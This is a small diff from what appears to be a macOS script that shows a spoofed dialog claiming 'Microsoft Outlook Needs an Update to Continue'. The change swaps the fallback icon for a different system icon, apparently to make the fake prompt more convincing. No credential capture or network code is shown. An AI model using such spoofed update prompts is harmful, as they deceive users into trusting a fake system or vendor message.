@@ -15,7 +15,7 @@ if (outlookIconexistsCheck == true){
   var title = "Microsoft Outlook Needs an Update to Continue";
   var text = "Microsoft Outlook Needs an Update to Continue";
 } else {
-    var icon = "/System/Library/PreferencePanes/SoftwareUpdate.prefPane/Contents/Resources/SoftwareUpdate.icns";
+    var icon = "/System/Library/PrivateFrameworks/PreferencePanesSupport.framework/PlugIns/AdvertisingExtension.appex/Contents/Resources/icon.icns";
     var title = "An Application Needs an Update to Continue";
     var text = "An Application Needs an Update to Continue";}
 
